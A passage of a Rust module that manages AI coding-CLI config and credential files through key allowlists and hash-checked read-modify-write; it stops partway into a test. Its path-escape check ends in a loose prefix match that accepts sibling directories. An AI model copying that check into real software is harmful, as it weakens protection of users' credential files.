//! Provider-native host config management (key-level allowlist + RMW).
//! See docs/design/runtimeAgent/provider-native-config-management.md

use std::collections::BTreeMap;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::SystemTime;

use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use toml_edit::{DocumentMut, Item, Table, Value as TomlValue};

/// Logical config surfaces managed by this adapter.
pub const CONFIG_KEY_MODEL_PROFILE: &str = "model_profile";
pub const CONFIG_KEY_AUTH: &str = "auth";

pub const PROVIDER_CLAUDE_CODE: &str = "claude-code";
pub const PROVIDER_CODEX: &str = "codex";
pub const PROVIDER_OPENCODE: &str = "opencode";

const HASH_PREFIX: &str = "sha256:";

const CLAUDE_ENV_ALLOW: &[&str] = &[
    "ANTHROPIC_BASE_URL",
    "ANTHROPIC_AUTH_TOKEN",
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_MODEL",
    "ANTHROPIC_SMALL_FAST_MODEL",
];

const CODEX_PROVIDER_FIELDS: &[&str] = &[
    "name",
    "base_url",
    "wire_api",
    "env_key",
    "requires_openai_auth",
    "experimental_bearer_token",
    "query_params",
    "http_headers",
];

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ConfigError {
    Validation(String),
    Conflict { actual_hash: String },
    Unmanageable { reason: String },
    Io(String),
}

impl std::fmt::Display for ConfigError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Validation(msg) => write!(f, "validation_error: {msg}"),
            Self::Conflict { actual_hash } => {
                write!(f, "conflict: file content hash mismatch (actual={actual_hash})")
            }
            Self::Unmanageable { reason } => write!(f, "unmanageable: {reason}"),
            Self::Io(msg) => write!(f, "io_error: {msg}"),
        }
    }
}

impl std::error::Error for ConfigError {}

impl ConfigError {
    pub fn error_code(&self) -> &'static str {
        match self {
            Self::Validation(_) => "validation_error",
            Self::Conflict { .. } => "conflict",
            Self::Unmanageable { .. } => "unmanageable",
            Self::Io(_) => "io_error",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ReadRequest {
    pub provider_type: String,
    pub config_key: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct WriteRequest {
    pub provider_type: String,
    pub config_key: String,
    pub values: Map<String, Value>,
    pub expected_file_content_hash: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ConfigSurfaceResult {
    pub provider_type: String,
    pub config_key: String,
    pub resolved_path: String,
    pub format: String,
    pub exists: bool,
    pub manageable: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub unmanageable_reason: Option<String>,
    pub managed_values: Map<String, Value>,
    pub file_content_hash: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub node_mtime: Option<String>,
    /// Keys that were present in the write request (for audit; not secrets).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub changed_keys: Vec<String>,
}

#[derive(Debug, Clone)]
struct SurfaceSpec {
    format: &'static str,
}

fn surface_spec(provider_type: &str, config_key: &str) -> Result<SurfaceSpec, ConfigError> {
    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE)
        | (PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH)
        | (PROVIDER_CODEX, CONFIG_KEY_AUTH)
        | (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE)
        | (PROVIDER_OPENCODE, CONFIG_KEY_AUTH) => Ok(SurfaceSpec { format: "json" }),
        (PROVIDER_CODEX, CONFIG_KEY_MODEL_PROFILE) => Ok(SurfaceSpec { format: "toml" }),
        _ => Err(ConfigError::Validation(format!(
            "unsupported provider_type/config_key: {provider_type}/{config_key}"
        ))),
    }
}

fn home_dir() -> PathBuf {
    env::var_os("HOME")
        .map(PathBuf::from)
        .or_else(|| env::var_os("USERPROFILE").map(PathBuf::from))
        .unwrap_or_else(|| PathBuf::from("/"))
}

fn xdg_config_home() -> PathBuf {
    env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| home_dir().join(".config"))
}

fn xdg_data_home() -> PathBuf {
    env::var_os("XDG_DATA_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| home_dir().join(".local").join("share"))
}

fn codex_home() -> PathBuf {
    env::var_os("CODEX_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| home_dir().join(".codex"))
}

/// Resolve the absolute path for a config surface (node-side evaluation only).
pub fn resolve_path(provider_type: &str, config_key: &str) -> Result<PathBuf, ConfigError> {
    let _ = surface_spec(provider_type, config_key)?;
    let path = match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE) => {
            home_dir().join(".claude").join("settings.json")
        }
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH) => {
            home_dir().join(".claude").join(".credentials.json")
        }
        (PROVIDER_CODEX, CONFIG_KEY_MODEL_PROFILE) => codex_home().join("config.toml"),
        (PROVIDER_CODEX, CONFIG_KEY_AUTH) => codex_home().join("auth.json"),
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE) => resolve_opencode_config_path(),
        (PROVIDER_OPENCODE, CONFIG_KEY_AUTH) => xdg_data_home().join("opencode").join("auth.json"),
        _ => {
            return Err(ConfigError::Validation(format!(
                "unsupported provider_type/config_key: {provider_type}/{config_key}"
            )));
        }
    };
    validate_resolved_path(provider_type, config_key, &path)?;
    Ok(path)
}

fn resolve_opencode_config_path() -> PathBuf {
    if let Some(explicit) = env::var_os("OPENCODE_CONFIG") {
        return PathBuf::from(explicit);
    }
    if let Some(dir) = env::var_os("OPENCODE_CONFIG_DIR") {
        return PathBuf::from(dir).join("opencode.json");
    }
    xdg_config_home().join("opencode").join("opencode.json")
}

fn config_root(provider_type: &str, config_key: &str) -> PathBuf {
    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, _) => home_dir().join(".claude"),
        (PROVIDER_CODEX, _) => codex_home(),
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE) => {
            if let Some(explicit) = env::var_os("OPENCODE_CONFIG") {
                return PathBuf::from(explicit)
                    .parent()
                    .map(Path::to_path_buf)
                    .unwrap_or_else(|| PathBuf::from("/"));
            }
            if let Some(dir) = env::var_os("OPENCODE_CONFIG_DIR") {
                return PathBuf::from(dir);
            }
            xdg_config_home().join("opencode")
        }
        (PROVIDER_OPENCODE, CONFIG_KEY_AUTH) => xdg_data_home().join("opencode"),
        _ => home_dir(),
    }
}

fn validate_resolved_path(
    provider_type: &str,
    config_key: &str,
    path: &Path,
) -> Result<(), ConfigError> {
    let root = config_root(provider_type, config_key);
    let root_canon = root.canonicalize().unwrap_or(root);
    // For non-existent paths, canonicalize parent + file name.
    let path_check = if path.exists() {
        path.canonicalize().map_err(|e| ConfigError::Io(e.to_string()))?
    } else {
        let parent = path
            .parent()
            .ok_or_else(|| ConfigError::Validation("path has no parent".into()))?;
        let file = path
            .file_name()
            .ok_or_else(|| ConfigError::Validation("path has no file name".into()))?;
        if parent.exists() {
            parent
                .canonicalize()
                .map_err(|e| ConfigError::Io(e.to_string()))?
                .join(file)
        } else {
            path.to_path_buf()
        }
    };
    let root_str = root_canon.to_string_lossy();
    let path_str = path_check.to_string_lossy();
    if path_str != root_str && !path_str.starts_with(&format!("{root_str}/")) && !path_str.starts_with(&format!("{root_str}\\")) {
        // OPENCODE_CONFIG may point at a file whose parent is the "root"; allow exact file under root or equal.
        if !path_str.starts_with(root_str.as_ref()) {
            return Err(ConfigError::Validation(format!(
                "resolved path escapes config root: {}",
                path.display()
            )));
        }
    }
    Ok(())
}

#[derive(Debug, Clone)]
pub struct Manageability {
    pub manageable: bool,
    pub reason: Option<String>,
}

/// Determine whether this surface can be managed via file on this node.
pub fn assess_manageability(provider_type: &str, config_key: &str) -> Result<Manageability, ConfigError> {
    let _ = surface_spec(provider_type, config_key)?;
    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH) => {
            // v1: never writable; macOS uses keychain, Linux has credentials file but OAuth refresh.
            if cfg!(target_os = "macos") {
                Ok(Manageability {
                    manageable: false,
                    reason: Some("platform_keychain".into()),
                })
            } else {
                Ok(Manageability {
                    manageable: false,
                    reason: Some("oauth_session_protected".into()),
                })
            }
        }
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE) => Ok(Manageability {
            manageable: true,
            reason: None,
        }),
        (PROVIDER_CODEX, CONFIG_KEY_AUTH) => {
            let store = read_codex_cli_auth_credentials_store();
            match store.as_deref() {
                Some("keyring") => Ok(Manageability {
                    manageable: false,
                    reason: Some("credentials_store_keyring".into()),
                }),
                Some("auto") => {
                    // auto may hit keyring; treat as unmanageable to avoid writing a file the CLI ignores.
                    Ok(Manageability {
                        manageable: false,
                        reason: Some("credentials_store_keyring".into()),
                    })
                }
                _ => Ok(Manageability {
                    manageable: true,
                    reason: None,
                }),
            }
        }
        (PROVIDER_CODEX, CONFIG_KEY_MODEL_PROFILE)
        | (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE)
        | (PROVIDER_OPENCODE, CONFIG_KEY_AUTH) => Ok(Manageability {
            manageable: true,
            reason: None,
        }),
        _ => Err(ConfigError::Validation(format!(
            "unsupported provider_type/config_key: {provider_type}/{config_key}"
        ))),
    }
}

fn read_codex_cli_auth_credentials_store() -> Option<String> {
    let path = codex_home().join("config.toml");
    let content = fs::read_to_string(path).ok()?;
    let doc = content.parse::<DocumentMut>().ok()?;
    doc.get("cli_auth_credentials_store")
        .and_then(|item| item.as_str())
        .map(|s| s.to_string())
}

pub fn file_content_hash(content: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content.as_bytes());
    format!("{HASH_PREFIX}{:x}", hasher.finalize())
}

pub fn empty_hash() -> String {
    file_content_hash("")
}

fn read_file_raw(path: &Path) -> Result<(bool, String, Option<String>), ConfigError> {
    if !path.exists() {
        return Ok((false, String::new(), None));
    }
    let content = fs::read_to_string(path).map_err(|e| ConfigError::Io(e.to_string()))?;
    let mtime = fs::metadata(path)
        .ok()
        .and_then(|m| m.modified().ok())
        .and_then(|t| t.duration_since(SystemTime::UNIX_EPOCH).ok())
        .map(|d| {
            // RFC3339-ish UTC
            let secs = d.as_secs() as i64;
            time_format_rfc3339(secs)
        });
    Ok((true, content, mtime))
}

fn time_format_rfc3339(unix_secs: i64) -> String {
    // Minimal RFC3339 without pulling chrono; enough for optional display.
    // Format via time crate if available.
    use time::OffsetDateTime;
    OffsetDateTime::from_unix_timestamp(unix_secs)
        .map(|dt| {
            dt.format(&time::format_description::well_known::Rfc3339)
                .unwrap_or_else(|_| unix_secs.to_string())
        })
        .unwrap_or_else(|_| unix_secs.to_string())
}

/// Read managed keys only (never returns full file body).
pub fn read_config(provider_type: &str, config_key: &str) -> Result<ConfigSurfaceResult, ConfigError> {
    let spec = surface_spec(provider_type, config_key)?;
    let path = resolve_path(provider_type, config_key)?;
    let manageability = assess_manageability(provider_type, config_key)?;
    let (exists, content, mtime) = read_file_raw(&path)?;
    let hash = file_content_hash(&content);
    let managed_values = if !exists || content.is_empty() {
        Map::new()
    } else {
        extract_managed_values(provider_type, config_key, &content, spec.format)?
    };
    Ok(ConfigSurfaceResult {
        provider_type: provider_type.to_string(),
        config_key: config_key.to_string(),
        resolved_path: path.display().to_string(),
        format: spec.format.to_string(),
        exists,
        manageable: manageability.manageable,
        unmanageable_reason: manageability.reason,
        managed_values,
        file_content_hash: hash,
        node_mtime: mtime,
        changed_keys: vec![],
    })
}

/// Write managed keys via read-modify-write. Null value deletes the key.
pub fn write_config(req: &WriteRequest) -> Result<ConfigSurfaceResult, ConfigError> {
    let spec = surface_spec(&req.provider_type, &req.config_key)?;
    let path = resolve_path(&req.provider_type, &req.config_key)?;
    let manageability = assess_manageability(&req.provider_type, &req.config_key)?;
    if !manageability.manageable {
        return Err(ConfigError::Unmanageable {
            reason: manageability
                .reason
                .unwrap_or_else(|| "unmanageable".into()),
        });
    }

    validate_write_keys(&req.provider_type, &req.config_key, &req.values)?;

    let (exists, content, _) = read_file_raw(&path)?;
    let actual_hash = file_content_hash(&content);
    if actual_hash != req.expected_file_content_hash {
        return Err(ConfigError::Conflict { actual_hash });
    }

    let new_content = apply_values(
        &req.provider_type,
        &req.config_key,
        &content,
        exists,
        spec.format,
        &req.values,
    )?;

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).map_err(|e| ConfigError::Io(e.to_string()))?;
    }
    fs::write(&path, &new_content).map_err(|e| ConfigError::Io(e.to_string()))?;

    let mut result = read_config(&req.provider_type, &req.config_key)?;
    result.changed_keys = req.values.keys().cloned().collect();
    result.changed_keys.sort();
    Ok(result)
}

fn validate_write_keys(
    provider_type: &str,
    config_key: &str,
    values: &Map<String, Value>,
) -> Result<(), ConfigError> {
    for key in values.keys() {
        if !is_managed_key(provider_type, config_key, key) {
            return Err(ConfigError::Validation(format!(
                "key not in allowlist: {key}"
            )));
        }
    }
    Ok(())
}

/// Data-only fields under `provider.<name>.` for opencode.
///
/// `npm` names an npm package that opencode loads to talk to the provider, and
/// `models.<id>.provider.*` can override it per model — both are code-loading
/// surfaces and stay out of the allowlist (see design §5.3). A bare
/// `provider.<name>` write is rejected because the object could carry `npm`.
fn is_opencode_provider_key(rest: &str) -> bool {
    let Some((_name, path)) = rest.split_once('.') else {
        return false;
    };
    if path == "name" {
        return true;
    }
    if path
        .strip_prefix("options.")
        .is_some_and(|tail| !tail.is_empty())
    {
        return true;
    }
    if let Some(model_rest) = path.strip_prefix("models.") {
        let Some((_model_id, field)) = model_rest.split_once('.') else {
            return false;
        };
        return field == "name"
            || field
                .strip_prefix("limit.")
                .is_some_and(|tail| !tail.is_empty());
    }
    false
}

fn is_managed_key(provider_type: &str, config_key: &str, key: &str) -> bool {
    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE) => {
            // `apiKeyHelper` is deliberately absent: it is a shell command Claude
            // Code executes to mint auth values (design §5.3).
            if key == "model" || key == "fallbackModel" {
                return true;
            }
            if let Some(rest) = key.strip_prefix("env.") {
                return CLAUDE_ENV_ALLOW.contains(&rest);
            }
            false
        }
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH) => false, // never writable v1
        (PROVIDER_CODEX, CONFIG_KEY_MODEL_PROFILE) => {
            if key == "model" || key == "model_provider" {
                return true;
            }
            if let Some(rest) = key.strip_prefix("model_providers.") {
                // model_providers.<name>.<field>
                let parts: Vec<&str> = rest.splitn(2, '.').collect();
                if parts.len() == 2 {
                    return CODEX_PROVIDER_FIELDS.contains(&parts[1]);
                }
            }
            false
        }
        (PROVIDER_CODEX, CONFIG_KEY_AUTH) | (PROVIDER_OPENCODE, CONFIG_KEY_AUTH) => {
            // Full file is managed (single-purpose auth file).
            !key.is_empty() && !key.contains("..") && !key.starts_with('/')
        }
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE) => {
            if key == "model" || key == "small_model" {
                return true;
            }
            key.strip_prefix("provider.")
                .is_some_and(is_opencode_provider_key)
        }
        _ => false,
    }
}

fn extract_managed_values(
    provider_type: &str,
    config_key: &str,
    content: &str,
    format: &str,
) -> Result<Map<String, Value>, ConfigError> {
    match format {
        "json" => extract_json_managed(provider_type, config_key, content),
        "toml" => extract_toml_managed(provider_type, config_key, content),
        other => Err(ConfigError::Validation(format!("unknown format: {other}"))),
    }
}

fn extract_json_managed(
    provider_type: &str,
    config_key: &str,
    content: &str,
) -> Result<Map<String, Value>, ConfigError> {
    let value: Value = serde_json::from_str(content).map_err(|e| {
        ConfigError::Validation(format!("invalid json: {e}"))
    })?;
    let obj = value
        .as_object()
        .ok_or_else(|| ConfigError::Validation("json root must be object".into()))?;

    let mut out = Map::new();
    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE) => {
            for k in ["model", "fallbackModel"] {
                if let Some(v) = obj.get(k) {
                    out.insert(k.to_string(), v.clone());
                }
            }
            if let Some(env) = obj.get("env").and_then(|v| v.as_object()) {
                for name in CLAUDE_ENV_ALLOW {
                    if let Some(v) = env.get(*name) {
                        out.insert(format!("env.{name}"), v.clone());
                    }
                }
            }
        }
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE) => {
            for k in ["model", "small_model"] {
                if let Some(v) = obj.get(k) {
                    out.insert(k.to_string(), v.clone());
                }
            }
            if let Some(provider) = obj.get("provider") {
                let mut flattened = Map::new();
                flatten_json_prefix("provider", provider, &mut flattened);
                // Never surface code-loading keys (npm / per-model provider override).
                for (key, value) in flattened {
                    if is_managed_key(provider_type, config_key, &key) {
                        out.insert(key, value);
                    }
                }
            }
        }
        (_, CONFIG_KEY_AUTH) => {
            // Full auth file keys (flat + nested flattened with dots).
            for (k, v) in obj {
                flatten_json_prefix(k, v, &mut out);
            }
        }
        _ => {}
    }
    Ok(out)
}

fn flatten_json_prefix(prefix: &str, value: &Value, out: &mut Map<String, Value>) {
    match value {
        Value::Object(map) => {
            for (k, v) in map {
                let key = format!("{prefix}.{k}");
                match v {
                    Value::Object(_) => flatten_json_prefix(&key, v, out),
                    other => {
                        out.insert(key, other.clone());
                    }
                }
            }
        }
        other => {
            out.insert(prefix.to_string(), other.clone());
        }
    }
}

fn extract_toml_managed(
    provider_type: &str,
    config_key: &str,
    content: &str,
) -> Result<Map<String, Value>, ConfigError> {
    let doc = content
        .parse::<DocumentMut>()
        .map_err(|e| ConfigError::Validation(format!("invalid toml: {e}")))?;
    let mut out = Map::new();
    if provider_type == PROVIDER_CODEX && config_key == CONFIG_KEY_MODEL_PROFILE {
        if let Some(item) = doc.get("model") {
            if let Some(v) = toml_item_to_json(item) {
                out.insert("model".into(), v);
            }
        }
        if let Some(item) = doc.get("model_provider") {
            if let Some(v) = toml_item_to_json(item) {
                out.insert("model_provider".into(), v);
            }
        }
        if let Some(Item::Table(providers)) = doc.get("model_providers") {
            for (name, provider_item) in providers.iter() {
                if let Item::Table(tbl) = provider_item {
                    for field in CODEX_PROVIDER_FIELDS {
                        if let Some(item) = tbl.get(field) {
                            if let Some(v) = toml_item_to_json(item) {
                                out.insert(format!("model_providers.{name}.{field}"), v);
                            }
                        }
                    }
                }
            }
        }
    }
    Ok(out)
}

fn toml_item_to_json(item: &Item) -> Option<Value> {
    match item {
        Item::Value(v) => toml_value_to_json(v),
        Item::Table(t) => {
            let mut map = Map::new();
            for (k, child) in t.iter() {
                if let Some(jv) = toml_item_to_json(child) {
                    map.insert(k.to_string(), jv);
                }
            }
            Some(Value::Object(map))
        }
        _ => None,
    }
}

fn toml_value_to_json(v: &TomlValue) -> Option<Value> {
    match v {
        TomlValue::String(s) => Some(Value::String(s.value().to_string())),
        TomlValue::Integer(i) => Some(Value::Number((*i.value()).into())),
        TomlValue::Float(f) => serde_json::Number::from_f64(*f.value()).map(Value::Number),
        TomlValue::Boolean(b) => Some(Value::Bool(*b.value())),
        TomlValue::Array(arr) => {
            let items: Option<Vec<Value>> = arr.iter().map(toml_value_to_json).collect();
            items.map(Value::Array)
        }
        TomlValue::InlineTable(tbl) => {
            let mut map = Map::new();
            for (k, child) in tbl.iter() {
                if let Some(jv) = toml_value_to_json(child) {
                    map.insert(k.to_string(), jv);
                }
            }
            Some(Value::Object(map))
        }
        _ => None,
    }
}

fn apply_values(
    provider_type: &str,
    config_key: &str,
    content: &str,
    exists: bool,
    format: &str,
    values: &Map<String, Value>,
) -> Result<String, ConfigError> {
    match format {
        "json" => apply_json_values(provider_type, config_key, content, exists, values),
        "toml" => apply_toml_values(provider_type, config_key, content, exists, values),
        other => Err(ConfigError::Validation(format!("unknown format: {other}"))),
    }
}

fn apply_json_values(
    provider_type: &str,
    config_key: &str,
    content: &str,
    exists: bool,
    values: &Map<String, Value>,
) -> Result<String, ConfigError> {
    let mut root: Value = if !exists || content.trim().is_empty() {
        Value::Object(Map::new())
    } else {
        serde_json::from_str(content).map_err(|e| {
            ConfigError::Validation(format!("invalid json: {e}"))
        })?
    };
    let obj = root
        .as_object_mut()
        .ok_or_else(|| ConfigError::Validation("json root must be object".into()))?;

    match (provider_type, config_key) {
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE) => {
            for (key, val) in values {
                if key == "model" || key == "fallbackModel" {
                    set_or_remove(obj, key, val);
                } else if let Some(env_key) = key.strip_prefix("env.") {
                    if !CLAUDE_ENV_ALLOW.contains(&env_key) {
                        return Err(ConfigError::Validation(format!(
                            "env subkey not allowed: {env_key}"
                        )));
                    }
                    let env = obj
                        .entry("env")
                        .or_insert_with(|| Value::Object(Map::new()));
                    let env_obj = env.as_object_mut().ok_or_else(|| {
                        ConfigError::Validation("env must be object".into())
                    })?;
                    set_or_remove(env_obj, env_key, val);
                    // Do not delete non-allowlisted env keys.
                    if env_obj.is_empty() {
                        obj.remove("env");
                    }
                } else {
                    return Err(ConfigError::Validation(format!(
                        "key not in allowlist: {key}"
                    )));
                }
            }
        }
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE) => {
            for (key, val) in values {
                if key == "model" || key == "small_model" {
                    set_or_remove(obj, key, val);
                } else if let Some(rest) = key
                    .strip_prefix("provider.")
                    .filter(|r| is_opencode_provider_key(r))
                {
                    apply_nested_path(obj, "provider", rest, val)?;
                } else {
                    return Err(ConfigError::Validation(format!(
                        "key not in allowlist: {key}"
                    )));
                }
            }
        }
        (_, CONFIG_KEY_AUTH) => {
            for (key, val) in values {
                apply_flat_or_nested(obj, key, val)?;
            }
        }
        _ => {
            return Err(ConfigError::Validation(
                "write not supported for this surface".into(),
            ));
        }
    }

    serde_json::to_string_pretty(&root)
        .map(|s| {
            if s.ends_with('\n') {
                s
            } else {
                format!("{s}\n")
            }
        })
        .map_err(|e| ConfigError::Io(e.to_string()))
}

fn set_or_remove(obj: &mut Map<String, Value>, key: &str, val: &Value) {
    if val.is_null() {
        obj.remove(key);
    } else {
        obj.insert(key.to_string(), val.clone());
    }
}

fn apply_nested_path(
    root: &mut Map<String, Value>,
    head: &str,
    rest: &str,
    val: &Value,
) -> Result<(), ConfigError> {
    let parts: Vec<&str> = rest.split('.').collect();
    let container = root
        .entry(head.to_string())
        .or_insert_with(|| Value::Object(Map::new()));
    let mut current = container
        .as_object_mut()
        .ok_or_else(|| ConfigError::Validation(format!("{head} must be object")))?;
    for (i, part) in parts.iter().enumerate() {
        if i == parts.len() - 1 {
            set_or_remove(current, part, val);
            return Ok(());
        }
        let next = current
            .entry((*part).to_string())
            .or_insert_with(|| Value::Object(Map::new()));
        current = next
            .as_object_mut()
            .ok_or_else(|| ConfigError::Validation(format!("{part} must be object")))?;
    }
    Ok(())
}

fn apply_flat_or_nested(
    root: &mut Map<String, Value>,
    key: &str,
    val: &Value,
) -> Result<(), ConfigError> {
    if let Some((head, rest)) = key.split_once('.') {
        apply_nested_path(root, head, rest, val)
    } else {
        set_or_remove(root, key, val);
        Ok(())
    }
}

fn apply_toml_values(
    provider_type: &str,
    config_key: &str,
    content: &str,
    exists: bool,
    values: &Map<String, Value>,
) -> Result<String, ConfigError> {
    if provider_type != PROVIDER_CODEX || config_key != CONFIG_KEY_MODEL_PROFILE {
        return Err(ConfigError::Validation(
            "toml write only supported for codex/model_profile".into(),
        ));
    }
    let mut doc = if !exists || content.trim().is_empty() {
        DocumentMut::new()
    } else {
        content
            .parse::<DocumentMut>()
            .map_err(|e| ConfigError::Validation(format!("invalid toml: {e}")))?
    };

    for (key, val) in values {
        if key == "model" || key == "model_provider" {
            if val.is_null() {
                doc.remove(key.as_str());
            } else {
                doc[key.as_str()] = Item::Value(json_to_toml_value(val)?);
            }
        } else if let Some(rest) = key.strip_prefix("model_providers.") {
            let parts: Vec<&str> = rest.splitn(2, '.').collect();
            if parts.len() != 2 || !CODEX_PROVIDER_FIELDS.contains(&parts[1]) {
                return Err(ConfigError::Validation(format!(
                    "key not in allowlist: {key}"
                )));
            }
            let provider_name = parts[0];
            let field = parts[1];
            if !doc.contains_key("model_providers") {
                doc["model_providers"] = Item::Table(Table::new());
            }
            let providers = doc["model_providers"]
                .as_table_mut()
                .ok_or_else(|| ConfigError::Validation("model_providers must be table".into()))?;
            if !providers.contains_key(provider_name) {
                providers.insert(provider_name, Item::Table(Table::new()));
            }
            let provider_tbl = providers
                .get_mut(provider_name)
                .and_then(|i| i.as_table_mut())
                .ok_or_else(|| {
                    ConfigError::Validation(format!(
                        "model_providers.{provider_name} must be table"
                    ))
                })?;
            if val.is_null() {
                provider_tbl.remove(field);
            } else {
                provider_tbl.insert(field, Item::Value(json_to_toml_value(val)?));
            }
        } else {
            return Err(ConfigError::Validation(format!(
                "key not in allowlist: {key}"
            )));
        }
    }
    Ok(doc.to_string())
}

fn json_to_toml_value(val: &Value) -> Result<TomlValue, ConfigError> {
    match val {
        Value::Null => Err(ConfigError::Validation("null cannot convert to toml value".into())),
        Value::Bool(b) => Ok(TomlValue::from(*b)),
        Value::Number(n) => {
            if let Some(i) = n.as_i64() {
                Ok(TomlValue::from(i))
            } else if let Some(f) = n.as_f64() {
                Ok(TomlValue::from(f))
            } else {
                Err(ConfigError::Validation("unsupported number".into()))
            }
        }
        Value::String(s) => Ok(TomlValue::from(s.as_str())),
        Value::Array(arr) => {
            let mut toml_arr = toml_edit::Array::new();
            for item in arr {
                toml_arr.push(json_to_toml_value(item)?);
            }
            Ok(TomlValue::Array(toml_arr))
        }
        Value::Object(map) => {
            let mut tbl = toml_edit::InlineTable::new();
            for (k, v) in map {
                tbl.insert(k, json_to_toml_value(v)?);
            }
            Ok(TomlValue::InlineTable(tbl))
        }
    }
}

/// Safe receipt fields (no managed_values) for writeback persistence.
pub fn receipt_safe_result(result: &ConfigSurfaceResult) -> BTreeMap<String, Value> {
    let mut map = BTreeMap::new();
    map.insert(
        "provider_type".into(),
        Value::String(result.provider_type.clone()),
    );
    map.insert(
        "config_key".into(),
        Value::String(result.config_key.clone()),
    );
    map.insert(
        "resolved_path".into(),
        Value::String(result.resolved_path.clone()),
    );
    map.insert("format".into(), Value::String(result.format.clone()));
    map.insert("exists".into(), Value::Bool(result.exists));
    map.insert("manageable".into(), Value::Bool(result.manageable));
    if let Some(reason) = &result.unmanageable_reason {
        map.insert(
            "unmanageable_reason".into(),
            Value::String(reason.clone()),
        );
    }
    map.insert(
        "file_content_hash".into(),
        Value::String(result.file_content_hash.clone()),
    );
    if let Some(mtime) = &result.node_mtime {
        map.insert("node_mtime".into(), Value::String(mtime.clone()));
    }
    if !result.changed_keys.is_empty() {
        map.insert(
            "changed_keys".into(),
            Value::Array(
                result
                    .changed_keys
                    .iter()
                    .map(|k| Value::String(k.clone()))
                    .collect(),
            ),
        );
    }
    // Key names only (not values) for audit of pull.
    let key_names: Vec<Value> = result
        .managed_values
        .keys()
        .map(|k| Value::String(k.clone()))
        .collect();
    map.insert("managed_key_names".into(), Value::Array(key_names));
    map
}

/// Full result for writeback transit (CP extracts managed_values then strips for receipt).
pub fn receipt_transit_result(result: &ConfigSurfaceResult) -> BTreeMap<String, Value> {
    let mut map = receipt_safe_result(result);
    map.insert(
        "managed_values".into(),
        Value::Object(result.managed_values.clone()),
    );
    map
}

/// Known config surfaces for heartbeat summary (exists + manageable + hash only).
pub fn list_surface_summaries() -> Vec<ConfigSurfaceResult> {
    let surfaces = [
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_MODEL_PROFILE),
        (PROVIDER_CLAUDE_CODE, CONFIG_KEY_AUTH),
        (PROVIDER_CODEX, CONFIG_KEY_MODEL_PROFILE),
        (PROVIDER_CODEX, CONFIG_KEY_AUTH),
        (PROVIDER_OPENCODE, CONFIG_KEY_MODEL_PROFILE),
        (PROVIDER_OPENCODE, CONFIG_KEY_AUTH),
    ];
    let mut out = Vec::new();
    for (provider, key) in surfaces {
        match read_config(provider, key) {
            Ok(mut r) => {
                r.managed_values = Map::new(); // never put values on heartbeat path
                out.push(r);
            }
            Err(_) => {
                // Skip unreadable surfaces in summary.
            }
        }
    }
    out
}

// NOTE: sensitivity classification deliberately lives only on the Control Plane
// (`isSensitiveManagedKey`), which owns encryption at rest and now serves the
// key list to the Console. A second copy here was unused and only created drift
// risk between the two rules, so it was removed rather than mirrored.

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    // Serialize env-mutating tests.
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    fn with_temp_home<F: FnOnce(&Path)>(f: F) {
        let _guard = ENV_LOCK.lock().unwrap();
        let dir = tempfile::tempdir().unwrap();
        let home = dir.path().to_path_buf();
        // Clear framework env so resolution uses HOME only.
        let keys = [
            "HOME",
            "CODEX_HOME",
            "OPENCODE_CONFIG",
            "OPENCODE_CONFIG_DIR",
            "XDG_CONFIG_HOME",
            "XDG_DATA_HOME",
        ];
        let saved: Vec<_> = keys
            .iter()
            .map(|k| (*k, env::var_os(k)))
            .collect();
        unsafe {
            env::set_var("HOME", &home);
            env::remove_var("CODEX_HOME");
            env::remove_var("OPENCODE_CONFIG");
            env::remove_var("OPENCODE_CONFIG_DIR");
            env::remove_var("XDG_CONFIG_HOME");
            env::remove_var("XDG_DATA_HOME");
        }
        f(&home);
        unsafe {
            for (k, v) in saved {
                match v {
                    Some(val) => env::set_var(k, val),
                    None => env::remove_var(k),
                }
            }
        }
    }

    #[test]
    fn codex_rmw_preserves_mcp_and_projects_and_comments() {
        with_temp_home(|home| {
            let codex = home.join(".codex");
            fs::create_dir_all(&codex).unwrap();
            let path = codex.join("config.toml");
            let original = r#"# host comment
model = "gpt-4"
model_provider = "openai"

[mcp_servers.fs]
